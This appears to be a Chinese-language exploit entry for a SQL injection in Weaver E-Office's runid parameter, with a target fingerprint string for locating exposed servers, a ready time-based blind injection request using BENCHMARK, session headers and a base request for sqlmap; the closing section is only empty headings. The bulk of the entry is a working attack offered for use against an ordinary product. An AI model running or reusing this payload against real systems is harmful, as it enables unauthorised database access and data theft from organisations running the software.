# 泛微E-Officerunid存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="泛微 e-office OA"`
- **请求**：`GET /E-mobile/flow/forwardsucess.php?runid=1+AND+9926%3DBENCHMARK%285000000%2CMD5%280x7156734e%29%29&flowid=&flowprcs=&prcsid=&module=&scope=&page=&fromid=&detailid=&mobilesessionkey=&sessionkey=&diff=&contents=1&touserid=WV00000304 HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: LOGIN_LANG=cn; PHPSESSID=c5b42e74604afbba12c39f355810e3c4`

**请求体 / payload**
```

sqlmap
GET /E-mobile/flow/forwardsucess.php?runid=1&flowid=&flowprcs=&prcsid=&module=&scope=&page=&fromid=&detailid=&mobilesessionkey=&sessionkey=&diff=&contents=1&touserid=WV00000304 HTTP/1.1
Host: {hostname}
Cookie: LOGIN_LANG=cn; PHPSESSID=c5b42e74604afbba12c39f355810e3c4
```

**其他**
- 泛微 E-Office runid存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微E-office